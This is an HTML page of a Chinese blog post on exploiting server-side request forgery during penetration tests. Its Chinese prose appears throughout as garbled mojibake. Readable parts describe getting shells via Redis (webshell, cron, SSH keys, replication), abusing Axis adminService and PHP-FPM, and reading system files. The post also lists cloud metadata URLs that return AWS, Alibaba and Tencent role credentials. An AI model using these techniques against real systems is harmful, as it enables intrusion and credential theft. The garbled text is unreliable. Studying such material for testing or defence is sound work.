<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="John Doe" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  <meta name="description" content="A hexo theme." />
  
  
  
  <title>
    
      SSRFæ”»é˜²æŒ‡åŒ— 
      
      
      |
    
     Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="/css/math/katex.min.css">

<link rel="stylesheet" href="/css/math/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">CyxSec</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">SSRFæ”»é˜²æŒ‡åŒ—</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2024-10-28 15:31:58
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/SSRF/" title="SSRF">
                    #SSRF
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="åº"><a class="markdownIt-Anchor" href="#åº"></a> åº</h1>
<p>å¹³æ—¶åšæ¸—é€çš„æ—¶å€™é‡è§ssrfçš„æ¬¡æ•°å…¶å®ä¸å°‘ï¼Œä½†æ˜¯éƒ½æ˜¯ç‚¹åˆ°ä¸ºæ­¢ã€‚æ‰“æ”»é˜²çš„æ—¶å€™ï¼Œä¹Ÿç”¨äº†ssrfæ‰“äº†ä¸å°‘ç»„åˆæ‹³ã€‚</p>
<p>ç®€å•ä»æ”»é˜²çš„è§’åº¦ï¼Œç»“åˆä¹‹å‰è‡ªå·±åšçš„é¡¹ç›®ï¼Œåšä¸€ä¸ªè‡ªæˆ‘çš„æ€»ç»“å’Œç†è§£å§ã€‚</p>
<p><strong>å› ä¸ºæ˜¯ä¸ªäººçš„ä¸€äº›é¡¹ç›®ç»éªŒï¼Œå› æ­¤éš¾å…å­˜åœ¨é—æ¼ï¼Œæ¬¢è¿å„ä½å¸ˆå‚…è¡¥å……ã€‚</strong></p>
<h1 id="0x01-å¸¸è§åˆ©ç”¨ç‚¹"><a class="markdownIt-Anchor" href="#0x01-å¸¸è§åˆ©ç”¨ç‚¹"></a> 0x01 å¸¸è§åˆ©ç”¨ç‚¹</h1>
<h2 id="æ–‡ä»¶è¯»å–"><a class="markdownIt-Anchor" href="#æ–‡ä»¶è¯»å–"></a> æ–‡ä»¶è¯»å–</h2>
<p>æ”¯æŒfileåè®®ï¼Œä¸”æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶ã€‚</p>
<p>Linuxä¸‹çš„è¯»æ–‡ä»¶ï¼Œprocé‡Œé¢æœ‰å¾ˆå¤šæœ‰ä»·å€¼çš„ï¼ŒåŒ…æ‹¬è¿è¡Œç¯å¢ƒã€å‘½ä»¤è¡Œã€ç«¯å£ç­‰ç­‰ä¿¡æ¯ã€‚å•jarç¯å¢ƒä¸‹å¾ˆå®¹æ˜“ä¸‹è½½åˆ°æºç ã€‚</p>
<p>å…¶ä½™æ€è·¯å°±æ˜¯ï¼š</p>
<ul>
<li>å†å²å‘½ä»¤</li>
<li>æ—¥å¿—æ–‡ä»¶ï¼ˆæ¡†æ¶ã€webï¼‰</li>
<li>phpå¯ä»¥åˆ©ç”¨includeçš„ç‰¹æ€§ä¸€ç‚¹ç‚¹ä¸‹phpæ–‡ä»¶ã€‚</li>
<li>javaå¯ä»¥ä¸‹è½½å•jaræˆ–è€…web.xmlæ–‡ä»¶ï¼Œåˆ©ç”¨web.xmlè·¯ç”±ä¿¡æ¯ä¸‹è½½å¯¹åº”çš„classæ–‡ä»¶ï¼Œç„¶åé€šè¿‡importçš„ç‰¹æ€§ä¸‹è½½å…¶ä½™çš„classæ–‡ä»¶ã€‚</li>
<li>javaçš„é…ç½®æ–‡ä»¶fuzzï¼ˆjdbcã€aliyunç­‰é…ç½®æ–‡ä»¶ï¼‰</li>
<li>.netçš„web.config ç»“åˆmachineKey æ‰“ååºåˆ—åŒ–ã€‚å…¶ä½™ä¸‹è½½æºç çš„æ–¹å¼ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡.neté‡è§ç¼–è¯‘dllçš„åœºæ™¯æ›´å¤šã€‚</li>
</ul>
<p><strong>å…¶å®é—®é¢˜ä¸»è¦åœ¨è¦è¾“å…¥è·Ÿè·¯å¾„ï¼Œè¿™ä¸æ–‡ä»¶ä¸‹è½½ä¸å¤ªä¸€æ ·ï¼Œæœ‰æ—¶å€™å¾ˆéš¾æ‰¾åˆ°ç‰©ç†è·¯å¾„ã€‚</strong></p>
<p>å®æˆ˜ä¸­å¯ä»¥å’Œæ´å¯ä»¥ç»“åˆèµ·æ¥åˆ©ç”¨ï¼Œæ¯”å¦‚åˆ—ç›®å½•æ¼æ´ã€‚</p>
<p>å¸¸è§çš„åˆ—ç›®å½•æ¼æ´å°±æ˜¯<strong>FCKeditor</strong>ç¼–è¾‘å™¨äº†ã€‚ï¼ˆåˆ—ç›®å½•è¿˜æœ‰ä¸ªå¦™ç”¨å°±æ˜¯åˆ—tmpç›®å½•ï¼Œè¿™æ ·å°±èƒ½æ‹¿åˆ°phpçš„sessionidäº†ï¼‰</p>
<h2 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h2>
<p>redisåœ¨æ¸—é€ä¸­ç»å¸¸é‡è§ã€‚</p>
<p>å®æˆ˜ä¸­æ€ä¹ˆçŸ¥é“ç³»ç»Ÿæœ‰æ²¡æœ‰redisæœåŠ¡å‘¢ï¼Ÿ</p>
<p><strong>å¯ä»¥å°è¯•è¯»å–/etc/passwdæ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ— redisç”¨æˆ·ã€‚</strong></p>
<ol>
<li>åˆ©ç”¨æ–¹å¼</li>
</ol>
<p>redisæ‹¿shellä¸€èˆ¬ä¸»è¦åˆ©ç”¨</p>
<ul>
<li>å¤‡ä»½æ•°æ®åº“ï¼Œæˆ‘ä»¬è®¾ç½®é”®å€¼ä¸ºæˆ‘ä»¬æƒ³è¦çš„payloadï¼Œè¿™æ ·å°±èƒ½å¤‡ä»½åˆ°payloadåˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®å½•ã€‚</li>
</ul>
<p>è¿™æ ·å°±ä¼šå­˜åœ¨è„æ•°æ®ï¼Œå› æ­¤ä¸€èˆ¬å¸¸è§å°±æ˜¯webshellã€è®¡åˆ’ä»»åŠ¡å’Œsshå…¬é’¥åˆ©ç”¨æ–¹å¼ï¼Œ<strong>webshellä¸€èˆ¬ç‰¹æ®Šå­—ç¬¦ä¸å½±å“è§£æï¼Œsshå…¬é’¥å’Œè®¡åˆ’ä»»åŠ¡ä¼šé‡‡å–æ¢è¡Œçš„æ–¹å¼é¿å…è„æ•°æ®ï¼Œè®¡åˆ’ä»»åŠ¡è¿™ä¸ªé—®é¢˜åœ¨ä¸åŒçš„linuxç³»ç»Ÿå°±ä¸ä¸€æ ·äº†ï¼Œdebainå’Œubuntuå¯¹è®¡åˆ’ä»»åŠ¡æ ¼å¼æœ‰ä¸¥æ ¼è¦æ±‚ï¼ˆæ–‡ä»¶æƒé™ä¹Ÿæœ‰é™åˆ¶ï¼‰ï¼Œåªæœ‰centoså¯ä»¥åˆ©ç”¨</strong></p>
<ul>
<li>ä¸»ä»å¤åˆ¶ï¼Œç®€å•ç†è§£å°±æ˜¯åŒæ­¥æ•°æ®ï¼Œè¿™æ ·å†™å…¥ä¸ä¼šå­˜åœ¨è„æ•°æ®ï¼Œä¹Ÿå¯ä»¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li>
</ul>
<ol start="2">
<li>redisä¸ºä»€ä¹ˆåœ¨ssrfä¸­ç”¨çš„è¿™ä¹ˆå¤šå‘¢ï¼Ÿï¼Ÿ</li>
</ol>
<p>å…¶å®ä¸redisä½¿ç”¨çš„é€šè®¯åè®®æœ‰å…³ï¼Œæ¯ä¸ªæœåŠ¡éƒ½ä¼šæœ‰è‡ªå·±çš„é€šè®¯åè®®ï¼Œäº†è§£è¿‡tcpçš„åº”è¯¥çŸ¥é“tcpçš„æ•°æ®æ„é€ æœ‰å¤šå¤æ‚ï¼Œæ¯ä¸ªhexå€¼éƒ½æœ‰è‡ªå·±çš„å«ä¹‰ã€‚</p>
<p>ä½†æ˜¯redisçš„é€šè®¯åè®®å°±æ¯”è¾ƒç²—ç³™äº†ã€‚</p>
<p>æ¯”å¦‚â€œset name è™å“¥â€œåœ¨åè®®ä¸‹å°±æ˜¯å¦‚æ­¤æ„é€ çš„ï¼Œæ ¼å¼å¾ˆç®€å•ï¼Œè¯­å¥æ˜¯ç”¨CRLFåˆ†æ®µçš„ã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919165618027.png" alt="image-20240919165618027" /></p>
<h3 id="redisåè®®æœºåˆ¶"><a class="markdownIt-Anchor" href="#redisåè®®æœºåˆ¶"></a> Redisåè®®æœºåˆ¶</h3>
<p>ä¸Šé¢æˆ‘ä»¬åˆ†æäº†redisçš„åè®®respï¼Œä½†æ˜¯æˆ‘ä»¬æè¿‡ä¸€äº›å®æˆ˜åº”è¯¥çŸ¥é“ï¼Œdictåè®®ä¹Ÿæ˜¯èƒ½æ‰“redisçš„ï¼Œä½†æ˜¯dictåè®®æœ¬èº«æ²¡åŠæ³•æ„é€ å‡ºå®Œæ•´çš„respåè®®ï¼Œä¸ºä»€ä¹ˆdictåè®®èƒ½è¢«ç”¨åœ¨æ‰“redisä¸­å‘¢ï¼Ÿ</p>
<p>é‡äº‹ä¸å†³ï¼ŒwiresharkæŠ“ä¸€ä¸‹åŒ…åˆ†æä¸€ä¸‹ã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923141623931.png" alt="image-20240923141623931" /></p>
<p>åˆ†æäº†åŸå§‹çš„tcpæ•°æ®æµï¼Œæˆ‘ä»¬å‘ç°è¯·æ±‚æ ¼å¼æ²¡æœ‰æŒ‰ç…§respåè®®å»æ„é€ ï¼Œä½†æ˜¯ä¾ç„¶æ­£å¸¸å“åº”äº†ç»“æœã€‚</p>
<p>ç¿»äº†åŠå¤©redisæ–‡æ¡£æ²¡æ‰¾åˆ°ç›¸å…³è¯´æ³•ï¼Œå»githubä¸Šé¢çœ‹ä¸€ä¸‹æºç ï¼š</p>
<p><strong>å…¶å®redisåšäº†å…¼å®¹æ€§å¤„ç†ï¼Œé»˜è®¤æƒ…å†µä¸‹Redis å¯ä»¥è§£æç›´æ¥é€šè¿‡ TCP å‘é€çš„ç®€å•çš„ã€ä»¥ç©ºæ ¼åˆ†éš”çš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œå¦‚ <code>SET key value</code></strong></p>
<p>å…·ä½“çœ‹ä¸‹å›¾ï¼šå¦‚æœæ•°æ®ä¸ä»¥*å¼€å¤´ï¼Œå°†ä¼šè®¤ä¸ºæ˜¯INLINEæ ¼å¼çš„æ•°æ®ï¼Œåé¢ä¸€æ ·ä¼šè¿›è¡Œè§£æï¼ŒæŒ‰ç…§ç©ºæ ¼åˆ†å‰²å‘½ä»¤å­—ç¬¦ä¸²</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923142334205.png" alt="image-20240923142334205" /></p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923142856744.png" alt="image-20240923142856744" /></p>
<p><strong>redisåˆ©ç”¨çš„æ€è·¯ä¸€ä¸‹å­å°±è¢«æ‰“å¼€äº†ï¼Œåªè¦èƒ½å®Œæ•´æ§åˆ¶ä¸€è¡Œçš„tcpæ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å’Œredisé€šè®¯</strong></p>
<p>æˆ‘ä»¬å‘ç°redisç¡®å®å°è¯•è§£æäº†æˆ‘ä»¬å‘é€çš„<strong>httpè¯·æ±‚</strong>çš„æ‰€æœ‰å­—æ®µï¼Œä¸”æœ€åçš„setå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚ï¼ˆæ³¨æ„è¿™é‡Œè¦æœ‰æ¢è¡Œå›è½¦ï¼‰</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923143459606.png" alt="image-20240923143459606" /></p>
<p><strong>æ€è·¯å†å‘æ•£ä¸€ç‚¹ï¼Œæˆ‘ä»¬èƒ½å‘é€CRLFï¼Œå°±èƒ½æ§åˆ¶å’Œredisåšäº¤äº’ï¼Œè¿™æ ·æœ‰ä¸€äº›å¯èƒ½å­˜åœ¨CRLFæ³¨å…¥çš„é¸¡è‚‹ssrfä¹Ÿèƒ½åˆ©ç”¨åˆ°redisäº†ï¼Œæ¯”å¦‚weblogic</strong></p>
<h3 id="æœ‰å¯†ç æƒ…å†µçš„åˆ©ç”¨"><a class="markdownIt-Anchor" href="#æœ‰å¯†ç æƒ…å†µçš„åˆ©ç”¨"></a> æœ‰å¯†ç æƒ…å†µçš„åˆ©ç”¨</h3>
<p>linuxçœ‹passwdå¯ä»¥åˆæ­¥åˆ¤æ–­æœ‰æ— redisæœåŠ¡ã€‚ç„¶åå°±æ˜¯è¯»redisé…ç½®æ–‡ä»¶æˆ–è€…ä»£ç çš„é…ç½®æ–‡ä»¶è·å–å¯†ç äº†</p>
<p>æœ‰å¯†ç ä¸»è¦æ¶‰åŠåˆ°éäº¤äº’æ¨¡å¼ä¸‹authçš„é€»è¾‘ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://redis.io/topics/pipelining%E3%80%82%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BB%99%E5%87%BA%E4%BA%86%E6%96%B9%E6%A1%88%EF%BC%8Credis%E6%94%AF%E6%8C%81%E4%B8%80%E6%AC%A1%E5%8F%91%E5%87%BA%E5%A4%9A%E6%AC%A1request%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9D%9E%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F%E4%B8%8B%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E9%83%BD%E9%A2%9D%E5%A4%96%E5%B8%A6%E4%B8%80%E4%B8%8Bauth%E3%80%82">https://redis.io/topics/pipeliningã€‚å®˜æ–¹æ–‡æ¡£ç»™å‡ºäº†æ–¹æ¡ˆï¼Œredisæ”¯æŒä¸€æ¬¡å‘å‡ºå¤šæ¬¡requestï¼Œå› æ­¤éäº¤äº’æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ¯æ¬¡è¯·æ±‚éƒ½é¢å¤–å¸¦ä¸€ä¸‹authã€‚</a></p>
<p>ä¸Šé¢æˆ‘ä»¬ç®€å•å¸¦è¿‡ä¸€æ¬¡dictåè®®ï¼Œdictåè®®æ— æ³•ä¼ é€’æ¢è¡Œå›è½¦æ¥å¸¦ä¸Šå…¶ä»–å‘½ä»¤ï¼Œå› æ­¤dictåè®®åªèƒ½æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ï¼Œåœ¨éäº¤äº’çš„æƒ…å†µä¸‹å¿…é¡»åˆ©ç”¨pipelineçš„æ–¹å¼ä¸€æ¬¡å‘é€å¤šä¸ªè¯·æ±‚ã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923144213398.png" alt="image-20240923144213398" /></p>
<p>httpçš„æƒ…å†µæ˜¯å¯ä»¥çš„ï¼š</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923144621754.png" alt="image-20240923144621754" /></p>
<p>å› æ­¤åªè¦å¯ä»¥æ„é€ ä¸¤è¡Œæˆ–è€…å¤šè¡Œæ•°æ®ï¼Œå°±å¯ä»¥ç”¨æ¥æ”»å‡»redisã€‚</p>
<p>gopherå°±æ›´ä¸ç”¨æäº†ã€‚</p>
<h2 id="axis"><a class="markdownIt-Anchor" href="#axis"></a> Axis</h2>
<p>Axisçš„adminServiceå­˜åœ¨æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªæ¥å£é™åˆ¶äº†ä»…å…è®¸localhostè®¿é—®ï¼Œå› æ­¤é€šå¸¸é…åˆssrfæ‰“ç»„åˆæ‹³</p>
<p>æƒ³äº†è§£çš„å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://paper.seebug.org/1489/">https://paper.seebug.org/1489/</a></p>
<p><strong>ä¸åšè¯¦ç»†æ¼æ´åˆ†æï¼Œè¯´ä¸€äº›ç»éªŒå’Œæ‰“æ³•ã€‚</strong></p>
<p>apache Axisæ˜¯ä¸€ç§web serviceså¼•æ“ã€‚</p>
<ul>
<li>é»‘ç›’çš„æ—¶å€™å¯ä»¥çœ‹ä¸€ä¸‹axis/service/ã€axisã€serviceã€servicesã€axis2ç­‰ç›®å½•æ˜¯å¦å­˜åœ¨ç›¸å…³web serviceï¼Œå…·ä½“çš„axisç‰ˆæœ¬ä¹Ÿèƒ½çœ‹åˆ°</li>
<li>ç™½ç›’çš„æ—¶å€™çœ‹è·¯ç”±å°±å¯ä»¥äº†ï¼Œå…³é”®å­—å³å¯ã€‚</li>
</ul>
<p>Axisæ˜¯åŒæ—¶æ”¯æŒgetå’Œpostè¯·æ±‚çš„ï¼Œç›¸æ¯”è¾ƒäºpostè¯·æ±‚çš„å‚æ•°å’Œæ ¼å¼è¦æ±‚ï¼Œä½¿ç”¨GETçš„æƒ…å†µä¼šæ›´å¤šï¼Œå®æˆ˜ä¸­æ³¨æ„ç³»ç»Ÿä¸­å¯èƒ½è‡ªå¸¦çš„ç‰¹æ®Šå­—ç¬¦filterå³å¯ã€‚</p>
<h3 id="å®æˆ˜ä¸­çš„axisæ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#å®æˆ˜ä¸­çš„axisæ¡ˆä¾‹"></a> å®æˆ˜ä¸­çš„Axisæ¡ˆä¾‹</h3>
<p>åˆ©ç”¨å…¶ä»–ssrfï¼ˆä¾‹xxeç­‰ï¼‰ï¼Œé…åˆaxisæ‰“ç»„åˆæ‹³ã€‚æ¯”å¦‚åˆ©ç”¨å¾ˆå¤šçš„å®æ™¯hcmã€‚</p>
<p>è‡ªå·±ä¹‹å‰æ‰“æŸé‡‘èé¡¹ç›®ä¹Ÿé‡è§è¿‡ä¸€ä¸ªæœ‰æ„æ€çš„æƒ…å†µï¼š<strong>é…ç½®äº†nginxï¼Œå¯¼è‡´adminSeriveå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦å‰ç½®çš„ssrf</strong></p>
<h2 id="äº‘æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#äº‘æœåŠ¡å™¨"></a> äº‘æœåŠ¡å™¨</h2>
<p><strong>éœ€è¦å›æ˜¾ï¼Œä¸åŒæœåŠ¡å™¨å‚å•†çš„æ¥å£å’Œè¯·æ±‚æ–¹å¼å¯èƒ½ä¸åŒ</strong></p>
<p>è®¿é—®å…ƒæ•°æ®æœåŠ¡ï¼Œå¯èƒ½è·å–å®ä¾‹ä¿¡æ¯å’Œæ•°æ®</p>
<p>&lt;1&gt;äºšé©¬é€Šäº‘:</p>
<p>step1. è·å–é€šè¿‡ssrfæ¼æ´ï¼Œæ‹¿åˆ°iamè§’è‰²å</p>
<p><a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/iam/security-credentials">http://169.254.169.254/latest/meta-data/iam/security-credentials</a></p>
<p>step2. é€šè¿‡ssrfæ¼æ´ï¼Œæ‹¿åˆ°è¯¥è§’è‰²çš„ä¸´æ—¶å‡­æ®</p>
<p><a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">http://169.254.169.254/latest/meta-data/iam/security-credentials/</a>&lt;role_name&gt;</p>
<p>&lt;2&gt;é˜¿é‡Œäº‘</p>
<p>Step1. è·å–RAMè§’è‰²å</p>
<p><a target="_blank" rel="noopener" href="http://100.100.100.200/latest/meta-data/ram/security-credentials/">http://100.100.100.200/latest/meta-data/ram/security-credentials/</a></p>
<p>Step2. è·å–è¯¥è§’è‰²çš„å‡­æ®</p>
<p><a target="_blank" rel="noopener" href="http://100.100.100.200/latest/meta-data/ram/security-credentials/">http://100.100.100.200/latest/meta-data/ram/security-credentials/</a><a target="_blank" rel="noopener" href="http://100.100.100.200/latest/meta-data/ram/security-credentials/"></a></p>
<p>é˜¿é‡Œäº‘æä¾›è¿™ä¸ªå‡ ä¸ªapiä»…é™äºgetè¯·æ±‚</p>
<p>&lt;3&gt; è…¾è®¯äº‘</p>
<p>è·å–CAMè§’è‰²çš„å‡­æ®:</p>
<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/$%7Brole-name%7D">http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role-name}</a></p>
<p>è…¾è®¯äº‘æä¾›çš„apiï¼Œgetè¯·æ±‚å’Œpostè¯·æ±‚éƒ½æ¥æ”¶</p>
<p><strong>å®æˆ˜çœ‹è¿æ°”ï¼Œçœ‹å…·ä½“çš„è§’è‰²åˆ†é…</strong></p>
<h2 id="å†…ç½‘å¸¸è§ä¸šåŠ¡"><a class="markdownIt-Anchor" href="#å†…ç½‘å¸¸è§ä¸šåŠ¡"></a> å†…ç½‘å¸¸è§ä¸šåŠ¡</h2>
<h3 id="docker-api"><a class="markdownIt-Anchor" href="#docker-api"></a> docker Api</h3>
<p>apiè¦æ±‚postè°ƒç”¨ï¼Œå› æ­¤å¯¹äºssrfçš„å…¥å£ç‚¹é™åˆ¶è¾ƒå¤§ã€‚</p>
<p>å› ä¸ºè¦è·å–å®¹å™¨idç­‰ä¿¡æ¯ï¼Œå› æ­¤å¿…é¡»è¦æœ‰å›æ˜¾ã€‚</p>
<p>å®æˆ˜ä¸­é‡è§çš„å¾ˆå°‘ã€‚</p>
<h3 id="gitlab"><a class="markdownIt-Anchor" href="#gitlab"></a> gitlab</h3>
<p>ç»“åˆå›æ˜¾ssrfï¼Œé€šè¿‡gitlabå…¬å¼€çš„é¡¹ç›®ä¸‹è½½æºç ç­‰ã€‚</p>
<p>gitlab/exploreä¼šå­˜åœ¨æœªæˆæƒè®¿é—®ã€‚</p>
<p>å®æˆ˜å¯ä»¥ä¸‹è½½æ‰“åŒ…å¥½çš„ä»£ç æˆ–é…ç½®æ–‡ä»¶ã€‚</p>
<h3 id="php-fpm"><a class="markdownIt-Anchor" href="#php-fpm"></a> PHP-FPM</h3>
<pre class="line-numbers language-none"><code class="language-none">curl7.71.1å¢åŠ äº†é™åˆ¶ï¼š

https:&#x2F;&#x2F;github.com&#x2F;curl&#x2F;curl&#x2F;commit&#x2F;31e53584db5879894809fbde5445aac7553ac3e2

å¯¼è‡´æ— æ³•ä½¿ç”¨gopheræ„é€ åˆé€‚çš„åè®®æ•°æ®ï¼Œæ”»å‡»å¤±è´¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PHP-FPMæ¥æ”¶CGIåè®®å†…å®¹å¹¶è§£æï¼Œç„¶åæ‰§è¡Œå¯¹åº”çš„PHPæ–‡ä»¶ã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923160619294.png" alt="image-20240923160619294" /></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ†æä¸€ä¸‹CGIåè®®ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥ä¼ªé€ CGIåè®®ï¼Œè®©PHP-FPMå¯ä»¥è§£ææˆ‘ä»¬æƒ³è§£æçš„æ¶æ„æ–‡ä»¶ã€‚</p>
<p>æŠ“åŒ…çœ‹åˆ°cgiä¼ é€’çš„æ˜¯ä¸€ç³»åˆ—é”®å€¼å¯¹ä¿¡æ¯ã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924111527609.png" alt="image-20240924111527609" /></p>
<p>è¿™é‡Œç›´æ¥æ‹¿ç½‘ä¸Šç°æˆçš„åˆ†æä¸¾ä¾‹äº†ï¼š</p>
<p>ç”¨æˆ·è®¿é—®<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>ï¼Œå¦‚æœwebç›®å½•æ˜¯<code>/var/www/html</code>ï¼Œé‚£ä¹ˆä¼ é€’çš„é”®å€¼å¯¹å°†æ˜¯å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    'GATEWAY_INTERFACE'<span class="token operator">:</span> 'FastCGI/<span class="token number">1.0</span>'<span class="token punctuation">,</span>
    'REQUEST_METHOD'<span class="token operator">:</span> 'GET'<span class="token punctuation">,</span>
    'SCRIPT_FILENAME'<span class="token operator">:</span> '/var/www/html/index.php'<span class="token punctuation">,</span>
    'SCRIPT_NAME'<span class="token operator">:</span> '/index.php'<span class="token punctuation">,</span>
    'QUERY_STRING'<span class="token operator">:</span> '?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>
    'REQUEST_URI'<span class="token operator">:</span> '/index.php?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>
    'DOCUMENT_ROOT'<span class="token operator">:</span> '/var/www/html'<span class="token punctuation">,</span>
    'SERVER_SOFTWARE'<span class="token operator">:</span> 'php/fcgiclient'<span class="token punctuation">,</span>
    'REMOTE_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>
    'REMOTE_PORT'<span class="token operator">:</span> '<span class="token number">12345</span>'<span class="token punctuation">,</span>
    'SERVER_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>
    'SERVER_PORT'<span class="token operator">:</span> '<span class="token number">80</span>'<span class="token punctuation">,</span>
    'SERVER_NAME'<span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
    'SERVER_PROTOCOL'<span class="token operator">:</span> 'HTTP/<span class="token number">1.1</span>'
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
